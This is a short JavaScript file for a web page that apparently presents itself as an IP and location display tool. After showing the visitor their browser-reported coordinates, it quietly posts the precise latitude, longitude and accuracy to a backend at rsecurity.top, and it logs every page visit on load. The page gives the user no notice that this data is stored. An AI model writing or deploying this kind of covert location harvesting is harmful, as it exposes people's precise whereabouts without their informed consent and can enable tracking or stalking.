const API_BASE_URL = "https://api.rsecurity.top";

function getIP() {
  fetch(`${API_BASE_URL}/api/ip`)
    .then(res => res.json())
    .then(data => {
      document.getElementById("ip").innerText = data.ip;
    })
    .catch(() => {
      document.getElementById("ip").innerText = "Unavailable";
    });
}

function showAccurateLocation() {
  const result = document.getElementById("locationResult");
  result.textContent = "Waiting for permission...";
  document.getElementById("locationCard").style.display = "block";

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const lat = position.coords.latitude.toFixed(5);
      const lon = position.coords.longitude.toFixed(5);
      const accuracy = Math.round(position.coords.accuracy);

      result.innerHTML = `<br>
Lat: ${lat}<br>
Lon: ${lon}<br>
Accuracy: ~${accuracy}m
`;

      // Send to backend type shi 😭✌️
      fetch(`${API_BASE_URL}/api/location`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ lat, lon, accuracy })
      });
    },
    (error) => {
      const msgs = { 1: "Permission denied.", 2: "Position unavailable.", 3: "Timed out." };
      result.textContent = msgs[error.code] || "Unknown error.";
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

fetch(`${API_BASE_URL}/api/visit`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    page: window.location.pathname
  })
});
